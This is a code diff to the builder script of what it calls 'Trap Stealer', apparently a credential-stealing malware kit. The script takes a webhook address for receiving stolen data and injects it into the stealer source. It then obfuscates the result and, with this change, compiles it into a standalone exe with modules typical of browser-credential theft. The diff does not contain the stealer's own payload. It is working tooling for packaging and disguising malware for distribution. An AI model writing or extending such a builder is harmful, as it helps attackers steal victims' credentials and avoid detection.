@@ -5,9 +5,9 @@ while True:
     def clear_console():
         operating_system = platform.system()
         if operating_system == 'Windows':
-            os.system('cls')  # For Windows
+            os.system('cls')
         else:
-            os.system('clear')  # For Linux and macOS
+            os.system('clear')  
 
     def get_boolean_input(prompt):
         while True:
@@ -20,7 +20,6 @@ while True:
                 print('Invalid input. Please enter Y or N.')
 
 
-    # Read the contents of the source file with the appropriate encoding
     with open('main.py', 'r', encoding='utf-8', errors='replace') as file:
         content = file.read()
     Webhook = input('Enter the webhook -> ')
@@ -43,29 +42,54 @@ while True:
         file.write(new_content)
     clear_console()
     print('Created [+]')
-
+    
 
     Obfuscation = input('Do you want to obfuscate it? Y/N: ')
     Obfuscation = Obfuscation.lower()
+    Exe = input('Do you want to make Trap Stealer with the exe format? (Take 5 minutes) Y/N: ')
+    Exe = Exe.lower()
+    name = input('Enter how you want the file to be named (Do not put the extension): ')
     while True:
-        if Obfuscation.lower() in ['y', 'yes']:
+        if Obfuscation in ['y', 'yes']:
             try:
-                from cryptography.fernet import Fernet
-                with open(f'./Build/temp.py', 'w', encoding='utf-8') as file:
+                with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                     file.write(new_content)
-                subprocess.run(['python', 'obfuscator.py'], check=False)
-                quit()
+                subprocess.run(['python', 'obfuscator.py', f'{name}'], check=False)
+                break  
             except subprocess.CalledProcessError:
                 print('Obfuscation process encountered an error.')
+                break  
         elif Obfuscation in ['n', 'no']:
-            name = input('Enter how you want the file to be named (Do not put the extension) : ')
             with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                 file.write(new_content)
                 print(f'[+] File Created {name}.py')
                 input('Press any key to quit...')
-                break
+                break 
         else:
-            input('Invalid input. Please enter Y or N.')
-            break
-            
-    exit()
+            Obfuscation = input('Invalid input. Please enter Y or N: ')
+            Obfuscation = Obfuscation.lower()
+
+    while True:
+
+        
+        if Exe in ['y', 'yes']:
+            command = [
+                'nuitka',
+                '--onefile',
+                '--include-module=ctypes,sqlite3,Crypto,requests,optparse',
+                f'--output-dir=./Build',
+                f'./Build/{name}.py'
+            ]
+            try:
+                import nuitka
+            except ImportError:
+                subprocess.call(['pip', 'install', 'Nuitka'])
+            subprocess.run(command, check=True, shell=True)
+            input(f'File {name}.exe successfully created press any key to quit')
+            quit()
+        elif Exe in ['n', 'no']:
+            input('You chose not to create an exe. Press any key to quit')
+            quit()
+        else:
+            print('Invalid input for creating an exe. Please enter Y or N.')
+            quit()
